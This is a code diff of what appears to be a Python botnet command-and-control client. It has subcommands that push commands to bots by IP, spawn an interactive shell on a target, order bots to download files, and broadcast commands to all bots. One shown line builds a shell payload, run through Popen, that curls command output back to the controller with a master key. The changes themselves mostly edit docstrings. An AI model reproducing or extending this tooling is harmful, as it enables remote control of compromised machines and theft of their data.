@@ -200,7 +200,7 @@ ___  ___          _              _____                       _
 
     """
     Command: Push 
-    Description: Push a specific command to a specific bot. 
+    Description: Push a specific command to specific bot(bots). 
     """
     push_parser = argparse.ArgumentParser()
     push_parser.add_argument('-t', '--target', type=str, help="Target bot's IP address to push the command")
@@ -229,12 +229,11 @@ ___  ___          _              _____                       _
             if 'result' in res.text:
                 # This "hack" was used due to lack of knowledge of asyncio. Will come back to this... 
                 payload = "sleep " + TIMER + "; echo '\n[" + target + "] # " + args.command + "\n==========================================================\n';  curl -X POST -d 'masterkey'='" + MASTERKEY + "' " + URL + "/bot/" + target + "/result"
-                #print("[*] payload = ", payload)
                 process = Popen(payload, shell=True)
 
     """
     Command: Shell 
-    Description: Spawn an interactive shell between the target machine and the master. 
+    Description: Spawn an interactive shell between the target machine and the server. 
     """
     shell_parser = argparse.ArgumentParser()
     shell_parser.add_argument('-t', '--target', type=str, help="Target bot's IP address")
@@ -255,7 +254,7 @@ ___  ___          _              _____                       _
 
     """
     Command: Download
-    Description: Download a specific file from the server to the destination file path in agent's filesystem 
+    Description: Command a bot to download a specific file from the server to the destination file path in bot's filesystem 
     """
     download_parser = argparse.ArgumentParser()
     download_parser.add_argument('-t', '--target', type=str, help="Target bot's IP address to download the command")
@@ -282,7 +281,7 @@ ___  ___          _              _____                       _
 
     """
     Command: Broadcast 
-    Description: Issue a specific command to all of the bots in the server database 
+    Description: Issue a specific command to all of the bots in the server database. (note: Not sure how useful this is)
     """
     broadcast_parser = argparse.ArgumentParser()
     broadcast_parser.add_argument('-c', '--command', type=str, help='Command to push')
